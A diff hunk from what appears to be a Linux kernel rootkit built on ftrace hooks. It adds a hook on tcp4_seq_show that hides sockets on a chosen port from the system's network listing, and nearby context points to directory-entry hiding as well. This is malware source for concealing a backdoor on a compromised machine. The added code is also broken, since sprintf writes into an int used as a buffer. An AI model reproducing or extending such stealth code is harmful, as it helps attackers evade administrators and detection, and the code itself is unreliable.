@@ -376,6 +376,29 @@ done:
     kfree(dirent_ker);
     return ret;
 }
+
+/*
+ * hiding open ports that is equal to  PORT
+ * tcp4_seq_show
+*/
+static asmlinkage long hook_tcp4_seq_show(struct seq_file *seq, void *v){
+    struct sock *sk = v;
+    int port;
+
+    sprintf(port , "%x", PORT);
+
+    /*
+     * Check if sk_num is PORT
+     * If sk doesn't point to anything, then it points to 0x1
+     */
+    if (sk != (struct sock *)0x1 && sk->sk_num == port){
+        return 0;
+    }
+    /*
+     * Otherwise, just return with the real tcp4_seq_show()
+     */
+    return orig_tcp4_seq_show(seq, v);
+}
 #endif
 
 static struct ftrace_hook hooks[] = {
